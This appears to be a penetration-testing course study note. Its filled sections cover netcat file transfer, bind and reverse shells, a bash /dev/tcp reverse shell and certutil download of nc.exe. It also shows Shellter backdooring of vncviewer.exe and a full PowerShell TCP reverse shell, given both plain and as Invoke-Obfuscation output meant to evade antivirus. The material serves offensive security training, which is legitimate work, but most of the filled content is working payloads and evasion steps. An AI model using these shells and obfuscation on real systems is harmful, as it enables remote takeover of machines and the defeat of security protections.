- [SECTION 3 Host and Network Penetration Testing](#SECTION-3-Host-and-Network-Penetration-Testing)
  - System and Host Based Attacks
  - Network-Based Attacks
  - The Metasploit Framework (MSF)
  - [Exploitation](#Exploitation)
  - Post-Exploitation
  - Social Engineering

# SECTION 3 Host and Network Penetration Testing

## System and Host Based Attacks

## Network-Based Attacks

## The Metasploit Framework (MSF)

## Exploitation
### Vulnerability Scanning

### Searching For Exploits

### Fixing Exploits

### Bind and Reverse Shells
```
nc -help

-n : do not resolve hostnames
-v : verbosity, can be used multiple times
-l : listen
-p : local port number
-u : UDP instead of TCP
-e : execute command
```

```
cd /usr/share/windows-resources/binaries/
python -m SimpleHTTPServer 80

certutil -urlcache -f http://<ip>/nc.exe nc.exe
nc.exe -h
```
- Windows does not have `netcat` by default.

```
nc -nvlp <port>
nc -nv <ip> <port>

nc -nvlup <port>
nc -nvu <ip> <port>
```

```
nc -nvlp <port> > received.txt
nc -nv <ip> <port> < sent.txt
```
- Transferring files.

```
nc -nvlp <port> -e /bin/bash
nc -nv <ip> <port>
```
```
nc -nvlp <port> -e cmd.exe
nc -nv <ip> <port>
```
- Bind shells.

```
nc -nvlp <port>
nc -nv <ip> <port> -e /bin/bash
```
```
nc -nvlp <port>
nc -nv <ip> <port> -e cmd.exe
```
- Reverse shells.

- https://github.com/swisskyrepo/PayloadsAllTheThings
- https://www.revshells.com/

```
bash -i >& /dev/tcp/<ip>/<port> 0>&1
```

### Exploitation Frameworks

### Windows Exploitation

### Linux Exploitation

### AV Evasion & Obfuscation
- https://www.shellterproject.com/

```
sudo apt install shellter -y
```
- Shellter is a Windows executable, need Wine (https://www.winehq.org/) which is a compatibility layer for running Windows software on Unix-like systems.

```
sudo dpkg --add-architecture i386
sudo apt update
sudo apt install wine32 -y
```

```
mkdir ~/Desktop/AVBypass
cp /usr/share/windows-resources/binaries/vncviewer.exe ~/Desktop/AVBypass/vncviewer.exe

cd /usr/share/windows-resources/shellter
sudo wine shellter.exe
```
- After execution, a backup of the original PE is stored in `/usr/share/windows-resources/shellter/Shellter_Backups`.
- Select Stealth mode - `vncviewer.exe` will function normally.

### Obfuscating PowerShell Code
- https://github.com/danielbohannon/Invoke-Obfuscation

```
cd ~/Desktop/AVBypass
git clone https://github.com/danielbohannon/Invoke-Obfuscation

sudo apt install powershell -y
```

```
$client = New-Object System.Net.Sockets.TCPClient('10.0.2.15',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
- https://github.com/swisskyrepo/PayloadsAllTheThings
- Remove `powershell -nop -c` and double-quotes `"`.
- Save as `shell.ps1`.

```
pwsh
cd ./Invoke-Obfuscation/
Import-Module ./Invoke-Obfuscation.psd1
cd ..
Invoke-Obfuscation

SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
ENCODING
1
```

```
InvOKE-EXprESSION ([StRIng]::jOiN('', ( '36r99S108F105-101y110&116J32F61S32U78y101-119r45-79l98S106S101F99t116t32y83&121F115y116U101l109r46S78&101U116l46t83F111l99F107F101F116F115l46F84U67y80-67r108J105J101y110S116S40t39l49y48r46F48l46&50y46r49U53U39F44&49t50y51t52t41-59y36-115U116&114l101l97F109r32U61F32U36-99-108U105U101r110y116t46l71r101l116F83&116y114y101J97&109S40t41-59&91r98l121F116F101y91S93S93U36U98r121t116U101t115J32y61r32t48J46S46U54l53U53F51J53S124y37t123y48&125J59U119r104&105F108t101&40J40t36U105S32t61F32S36J115l116J114J101F97U109l46r82F101&97J100-40-36t98l121t116F101t115-44l32r48y44&32y36-98y121U116y101-115J46y76l101F110y103&116r104t41S41&32l45F110S101&32y48&41t123&59y36S100y97S116y97J32y61F32F40l78&101J119t45r79l98t106l101y99J116-32F45J84l121S112F101F78-97F109J101S32F83U121U115F116l101F109F46S84S101F120U116&46y65S83l67S73&73-69&110F99y111t100S105y110&103y41U46U71-101U116F83t116U114y105-110U103&40t36-98r121U116&101&115U44t48l44&32-36U105S41y59r36&115t101J110y100U98y97U99S107l32F61-32J40t105S101&120l32y36y100S97l116S97U32J50F62r38S49J32&124y32r79F117U116-45l83l116y114S105y110S103l32U41&59F36&115J101y110l100-98-97S99l107J50F32t61&32l36U115l101l110r100F98S97-99U107&32S43t32J39U80y83&32F39S32-43S32r40l112F119l100S41t46t80J97&116-104&32J43J32S39t62y32-39&59y36y115r101&110t100-98S121&116y101-32J61F32r40y91F116-101l120y116l46U101l110r99S111t100t105J110S103&93U58t58t65y83U67y73&73y41-46r71F101&116J66y121t116-101F115r40U36&115&101U110t100y98&97S99r107t50S41-59U36S115J116t114&101y97U109F46t87-114r105l116r101&40&36J115-101r110y100t98t121S116-101-44t48y44r36S115l101l110l100l98r121F116J101S46&76&101y110y103F116F104&41t59l36F115S116t114U101l97J109-46&70y108S117t115r104&40F41U125U59l36r99U108l105F101l110&116l46-67t108l111r115S101r40U41r10'.SpLIt( 'FSl-JUryt&' ) | fOREaCh{( [CHAR][iNt] $_)} )) ) 
```

```
BACK

SET SCRIPTPATH /home/kali/Desktop/AVBypass/shell.ps1
AST
ALL
1
```

```
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('10.0.2.15',1234));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```

## Post-Exploitation

## Social Engineering
